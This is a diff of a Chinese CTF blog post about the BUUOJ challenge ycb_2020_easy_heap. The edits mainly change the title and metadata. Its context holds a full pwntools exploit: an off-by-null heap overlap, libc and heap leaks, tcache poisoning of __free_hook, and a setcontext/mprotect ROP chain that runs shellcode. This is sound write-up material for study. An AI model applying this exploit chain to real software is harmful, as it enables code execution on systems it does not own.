@@ -18,7 +18,7 @@
   
     <meta name="description" content="ycb_2020_easy_heap程序在使用edit功能时出现了&#39;\x00&#39;字节溢出，很容易想到修改下一个chunk的prev_size 、size 和 PREV_INUSE标志位，让其与上边的unsorted chunk合并造成堆块重叠   ​																			 然而这里是libc-2.30.so，会对合并的上一个chunk的size检查，与修改的prev_">
 <meta property="og:type" content="article">
-<meta property="og:title" content="buu刷题1">
+<meta property="og:title" content="buu寒假刷题1">
 <meta property="og:url" content="https://xtxtn.github.io/2022/12/30/buu%E5%88%B7%E9%A2%981/index.html">
 <meta property="og:site_name" content="xtxtn&#39;s Blog">
 <meta property="og:description" content="ycb_2020_easy_heap程序在使用edit功能时出现了&#39;\x00&#39;字节溢出，很容易想到修改下一个chunk的prev_size 、size 和 PREV_INUSE标志位，让其与上边的unsorted chunk合并造成堆块重叠   ​																			 然而这里是libc-2.30.so，会对合并的上一个chunk的size检查，与修改的prev_">
@@ -27,14 +27,14 @@
 <meta property="og:image" content="https://xtxtn.github.io/img/8/Screenshot_20230101_022934.png">
 <meta property="og:image" content="https://xtxtn.github.io/img/8/Screenshot_20230101_041533.png">
 <meta property="article:published_time" content="2022-12-30T13:04:05.561Z">
-<meta property="article:modified_time" content="2023-01-03T16:59:20.093Z">
+<meta property="article:modified_time" content="2023-01-13T11:00:07.270Z">
 <meta property="article:author" content="xtxtn">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://xtxtn.github.io/img/8/Screenshot_20230101_012711.png">
   
   
   
-  <title>buu刷题1 - xtxtn&#39;s Blog</title>
+  <title>buu寒假刷题1 - xtxtn&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -211,7 +211,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="buu刷题1"></span>
+            <span id="subtitle" data-typed-text="buu寒假刷题1"></span>
           
         </div>
 
@@ -234,7 +234,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          7.1k 字
+          7k 字
         
       </span>
     
@@ -245,7 +245,7 @@
         
         
         
-          60 分钟
+          59 分钟
         
       </span>
     
@@ -283,7 +283,7 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">buu刷题1</h1>
+            <h1 style="display: none">buu寒假刷题1</h1>
             
             
               <div class="markdown-body">
@@ -305,7 +305,7 @@
 <img src="/img/8/Screenshot_20230101_022934.png" srcset="/img/loading.gif" lazyload style="zoom: 67%;" />
 
 <p>​                                                 </p>
-<p>程序开了沙盒，在<code>__free_hook</code>中写入rdi与rdx转化的gedget，再与<code>setcontext</code>函数相结合劫持rsp到堆上，最后直接ROP或者使用mprotect后写入shellcode（具体看我之前的的文章<a href="https://xtxtn.github.io/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF">NewStarCTF 公开赛Week4 pwn 这是堆🐎 - xtxtn’s Blog</a>）</p>
+<p>程序开了沙盒，在<code>__free_hook</code>中写入rdi与rdx转化的gedget，再与<code>setcontext</code>函数相结合劫持rsp到堆上，最后直接ROP或者使用mprotect后写入shellcode</p>
 <p>​       													                                                                                 </p>
 <p>完整的exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;easy_heap&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./easy_heap&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27074</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x420</span>)	<span class="hljs-comment">#本来是想通过large chunk一次性泄漏libc地址和堆地址, 但edit会引入&#x27;\x00&#x27;，最后改为tcache泄漏堆地址</span><br>add(<span class="hljs-number">0x130</span>)<br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">1104</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br>add(<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x18</span>)<br>show(<span class="hljs-number">1</span>)		<span class="hljs-comment">#重新申请后tcache指针依然残留，进而泄漏堆地址</span><br>p.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x6c0</span><br><br>add(<span class="hljs-number">0x110</span>)<br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>)<br>edit(<span class="hljs-number">3</span>, payload1)<br>payload2 = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x131</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, payload2)	<span class="hljs-comment">#伪造堆块</span><br>payload3 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x130</span>)<br>edit(<span class="hljs-number">1</span>, payload3)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0xf0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">11</span>):<br>    delete(i)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">4</span>)<br>delete(<span class="hljs-number">5</span>)<br><br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>magic_gadget = libcbase + <span class="hljs-number">0x154b90</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26bb2</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2709c</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c421</span><br>ret = libcbase + <span class="hljs-number">0x256b9</span><br>mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>edit(<span class="hljs-number">1</span>, p64(free_hook))<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">5</span>, p64(magic_gadget))<br><br>payload = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x6e0</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x6e0</span> + <span class="hljs-number">0x100</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(pop_rdi) + p64(heap_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0</span>) + p64(mprotect)<br>payload += p64(heap_addr + <span class="hljs-number">0x6e0</span> + <span class="hljs-number">0x150</span>)<br>payload = payload.ljust(<span class="hljs-number">0x150</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br><br>edit(<span class="hljs-number">0</span>, payload)<br>delete(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
@@ -353,7 +353,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>buu刷题1</div>
+      <div>buu寒假刷题1</div>
       <div>https://xtxtn.github.io/2022/12/30/buu刷题1/</div>
     </div>
     <div class="license-meta">
